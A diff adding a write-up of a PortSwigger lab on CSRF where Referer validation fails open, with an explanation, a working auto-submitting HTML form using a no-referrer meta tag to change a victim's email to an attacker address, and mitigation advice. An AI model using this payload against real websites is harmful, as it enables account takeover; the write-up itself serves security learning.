@@ -216,3 +216,51 @@ By default, modern browsers enforce `SameSite=Lax` on cookies, preventing them f
 3. The lab is successfully solved! 
 
 **Key Takeaway / Mitigation**: This highlights why SameSite attributes are a "defense-in-depth" mechanism, not a silver bullet. Browsers have quirks and exceptions. Applications must still implement robust, cryptographically secure Anti-CSRF tokens for all state-changing operations, regardless of cookie attributes.
+
+
+# 8TH Lab
+
+
+#  Lab: CSRF where Referer validation depends on header being present
+**Platform:** PortSwigger Web Security Academy
+**Goal:** Bypass the `Referer` header validation to change the victim's email address using an exploit server.
+**Vulnerability:** CSRF bypassing flawed `Referer` header validation.
+
+##  The Concept (The Missing Header Logic Flaw)
+Many applications validate the `Referer` header to ensure state-changing requests originate from their own domain, acting as an Anti-CSRF mechanism. However, a common logic flaw occurs when the validation is conditional upon the header's presence.
+The logic often looks like this:
+`if (Referer header exists) { validate it } else { allow request }`
+This is done to accommodate legitimate users whose corporate proxies or strict browser privacy settings strip the `Referer` header. An attacker can exploit this "fail-open" logic by suppressing the `Referer` header entirely from their cross-site request. 
+
+##  The Bypass Technique (Referrer Policy)
+HTML5 introduced the `<meta>` tag for `referrer` policies, allowing web pages to control how much referer information is sent. By setting the policy to `no-referrer`, the attacker instructs the victim's browser to completely omit the `Referer` header when making the cross-site POST request.
+
+##  Step-by-Step Exploitation
+
+### Step 1: Build the Exploit
+1. Navigate to the Exploit Server.
+2. Craft an HTML payload containing the CSRF POST form.
+3. In the `<head>` of the HTML, inject the `<meta name="referrer" content="no-referrer">` tag. This is the crucial step that disables the header.
+4. Add JavaScript to auto-submit the form.
+   ```html
+   <html>
+       <head>
+           <meta name="referrer" content="no-referrer">
+       </head>
+       <body>
+           <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST" id="csrf-form">
+               <input type="hidden" name="email" value="hacker@evil.com">
+           </form>
+           <script>
+               document.getElementById('csrf-form').submit();
+           </script>
+       </body>
+   </html>
+   ```
+   
+### Step 2: Execute the Takedown
+1. Click Store and then Deliver exploit to victim.
+2. The browser executes the POST request without the Referer header. The server's flawed validation skips the check and processes the malicious email change.
+3. The lab is successfully solved! 
+
+**Key Takeaway / Mitigation**: Security validations should "fail-closed," not "fail-open." If an application relies on the Referer header for security, it must reject requests where the header is missing or empty. However, relying solely on headers is fragile; robust Anti-CSRF tokens remain the industry standard defense.
